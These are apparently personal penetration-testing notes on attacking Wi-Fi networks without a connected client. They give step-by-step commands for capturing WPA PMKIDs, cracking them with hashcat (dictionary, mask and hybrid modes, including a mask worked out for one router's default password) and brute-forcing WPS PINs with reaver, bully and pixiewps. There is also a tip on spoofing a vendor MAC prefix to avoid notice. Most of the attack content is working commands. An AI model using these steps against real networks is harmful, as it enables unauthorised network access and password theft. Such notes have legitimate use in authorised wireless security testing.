#Client-less Attacks

#PMKID
  #Once a client and an AP have succesfully completed a 4-way, they maintain a PMK Security Association (PMKSA)
    #PMKSA = PMKID + Lifetime of PMK + MAC Address + Other Variables
  #Some networks employ AP Roaming, in which a client moves outside the range of an AP and connects to another AP within the network.
    #To avoid the toll on connectivity, networks may employ PMK Caching and skip the need to reauthenticate the client as it roams between APs by requesting the PMKSA instead.

In Wireshark:
  EAPOL (Message 1 of 4) > 802.1X Authentication > WPA Key Data: [hash] > PMK Identification

  #To successfully brute-force the PMKID, we need:
    WiFi Password (best-guess)
    WiFi SSID - Known
    Length of SSID - Known
    Authenticator/Supplicant MACs - Known
    PMK Name - Known

#HCX Tools

sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
cd /opt/
sudo git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools/
sudo make -j $(nproc)
sudo make install

#HCX Dumptool
  #This is insanely loud, so don't use this as your primary.

cd /opt/
sudo git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool/
sudo make -j $(nproc)
sudo make install

#WPA_Supplicant
  #Network Reconnaissance and Remote Authentication
    #Change your hostname, kill any internal network processes and prep an interface, but keep it in Managed Mode.

sudo airmon-ng check kill

    #Then we're going to use wpa_passphrase and the target's SSID, to create a wpa_supplicant configure file. the Tee is to show  you what it created.

wpa_passphrase "[SSID]" passphrase | sudo tee /etc/wpa_supplicant/wpa_supplicant_SSID.conf

    #This is what it will write in the config file:

network={
	ssid="[SSID]"
	#psk="passphrase"
	psk=a57f5b5eecc89cb33cf486e706bf249b2f45e5b364d0635cfaf4063f84fed7e9
}

#Now get a second card up to collect. We're going to run a targeted survey on the target AP and its channel.

#Open Wireshark and pipe your monitoring interface's data with a filter for EAPOL.

#Now we're going to run wpa_supplicant.

sudo wpa_supplicant -c /etc/wpa_supplicant/wpa_supplicant_ssid.conf -i [interface] -B -f supp.log
    #-c [absolute file path of config file]
    #-i [interface]
    #-B = run daemon in the background
    #-f = [log file name]

#Bring the card down again, and if that doesn't stop the attack then we're going to check for the active wpa_supplicant process number and we're going to kill it.
    #never kill a --color=auto process. It could crash your computer.

ps aux | grep wpa_supplicant
sudo kill [PID]

#We're going to mark the PMKID Message 1 and a beacon frame for the Access Point in Wireshark and export it like we would for a DeAuth attack.

#Hashcat
    #Hashcat is a popular and effective hash cracking utility used by pen testers and criminals. hashcat.net. man hashcat and hashcat --help are very different.
    
sudo apt install hashcat

    #baseline hashcat check. this runs a baseline for the PMKID+EAPOL hashes. You want to be around 300 KH/s

hashcat -b -m 22000
 
    #Hash pre-processing. We'll be extracting the necessary variables from a pcap file with the handshake/PMKID and a beacon frame.
    
    hcxpcapngtool -o [hash].22000 [file].pcap
    
    #Hashcat attack modes
        
        0 = straight dictionary
        1 = Combination
        3 = Brute-Force (Mask)
        6 = Hybrid word list + Mask
        7 = Hybrid Mask + Word List
    
    #Dictionary Example

hashcat -o [name].22000 [filename].pcap
hashcat -a 0 -m 22000 [name].22000 ~/path/to/rockyou.txt

#you should see [PMKID]:[AP]:[Client]:[hex ssid]:[password]

  #Combination Example

hashcat -a 0 -m 22000 [name].22000 [wordlist1] [wordlist2]

  #Brute-Force / Mask
    #WPA2 passwords can be 8-64 characters, where every single character can be a special character, uppercase, or lowercase. It is unfeasible to do this.
    #This combines a brute-force with a mask that bases itself off of human behavior.

  ?l = abcdefghijklmnopqrstuvwxyz
  ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
  ?d = 0123456789
  ?h = 0123456789abcdef
  ?H = 0123456789ABCDEF
  ?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
  ?a = ?l?u?d?s (placeholder for any unknowns)
  ?b = 0x00 - 0xff

e.g., Netgear MR110, Default SSID: ATT-WIFI-4TM6
  1st char to 2nd pos
  2nd to 4th
  3rd to 8th
  4th to 6th

hashcat -a 3 -m 22000 mask.22000 ?a4?aT?a6?aM

  #Hybrid List + Mask

hashcat -a 6 -m 22000 [name].22000 ~/path/to/rockyou.txt '?d?d'

  #Rules Lists



 #Hex username conversion

echo "[hex ssid]" | xxd -r -p
   
#download SecLists. This is going to take a while. This is massive repository 

sudo git clone https://github.com/danielmiessler/SecLists

#WPS
	#WiFi-Protected Setup that utilized a pin to authenticate to a network. This was significantly susceptible to brute-force attacks. It is very loud.
		#Called a Pixiedust, Reaver, or Bully attack.
			#Pixie attacks a flaw in WPS hash randomization, Reaver is an old-school way of defeating WPS hashes, and Bully is the new-school hash defeat.

	#download on laptop and pui

sudo apt install pixiewps && sudo apt install reaver && sudo apt install bully -y

	#Theory
		#Part 1: 4 digits with 10k permutation, Part 2: 1k permutations, Part 3: checksum
			#could be brute-forced in a few minutes
		#10,000,000 unique WPS pin possibilities but the different parts make it trivial. The update limits the amount of attempts prior to the system being locked out and the WPS functionality shut off.

https://tacticalware.com/list-of-wireless-ap-router-invulnerable-to-pixie-dust-attack/

	#You must have WPS Messages 1, 2, and 3 in order to be successful.

	#Variables Required
		
		PKE (Public Key of Enrollee) - Message 1
		E-Nonce - Messages 1 and 2
		PKR (PK of Registrar) - Message 2
		(optional) R-Nonce - Messages 2 and 3
		E-Hash 1 - Message 3
		E-Hash 2 - Message 3
		Authkey - In Reaver/Bully Terminal 
			#Tee the output out into the file to retain the Authkey.

	#You do not want to have a locally-assigned MAC address when running a Bully attack. Use a common OUI for the area or for the environment the target is in.

#Most-to-Least Intrusive Attack Methods

Bully/Reaver WPS Brute-Force < WPA Supplicant Remote Authentication > Aireplay-ng DeAuthentication Attack

	#Example:
		#This is another two-terminal attack. One is airodump-ng and a screened wireshark and the other will be reaver/bully.

sudo reaver 
	or
sudo bully -b [Target AP BSSID] -c [CH] -v 4 -d [interface] | tee [file name]
	#-v 4 = highest level of verbosity
	#-d = attempt to pipe to pixiewps

#Manual PixieWPS
	#you must have M1, 2, and 3. We can pull the hashes out of each message to run pixiewps when the bully command does not do it automatically.

pixiewps -e [PKE] -r [PKR] -m [RNONCE] -n [ENONCE] -s [EHASH1] -z [EHASH2] -a [authkey]

